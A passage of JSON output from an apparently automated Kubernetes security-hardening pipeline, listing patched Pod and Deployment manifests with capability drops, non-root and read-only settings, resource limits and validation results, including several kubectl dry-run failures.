    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00908",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00909",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00910",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "00911",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "00912",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "00913",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "00914",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00915",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00916",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00917",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00918",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause:stable\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "errors": []
  },
  {
    "id": "00919",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause:stable\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "errors": []
  },
  {
    "id": "00920",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause:stable\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "errors": []
  },
  {
    "id": "00921",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause:stable\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "errors": []
  },
  {
    "id": "00922",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause:stable\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "errors": []
  },
  {
    "id": "00923",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"cron-unbherbarium-lib-unb-ca\" namespace: \"dev\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00924",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"cron-unbherbarium-lib-unb-ca\" namespace: \"dev\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00925",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"cron-unbherbarium-lib-unb-ca\" namespace: \"dev\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00926",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"cron-unbherbarium-lib-unb-ca\" namespace: \"dev\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00927",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"cron-unbherbarium-lib-unb-ca\" namespace: \"dev\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "00928",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00929",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00930",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00931",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00932",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "errors": []
  },
  {
    "id": "00933",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "errors": []
  },
  {
    "id": "00934",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-heapster-v6\n  namespace: kube-system\n  labels:\n    k8s-app: heapster\n    version: v6\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: gcr.io/google_containers/heapster:v0.16.1\n        name: heapster\n        resources:\n          limits:\n            cpu: 100m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        command:\n        - /heapster\n        - --source=kubernetes:''\n        - --sink=gcl\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --poll_duration=2m\n        - --stats_resolution=1m\n        volumeMounts:\n        - name: ssl-certs\n          mountPath: /etc/ssl/certs\n          readOnly: true\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: ssl-certs\n        hostPath:\n          path: /etc/ssl/certs\n",
    "errors": []
  },
  {
    "id": "00935",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api:stable\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-password-secret\n              key: database_password\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          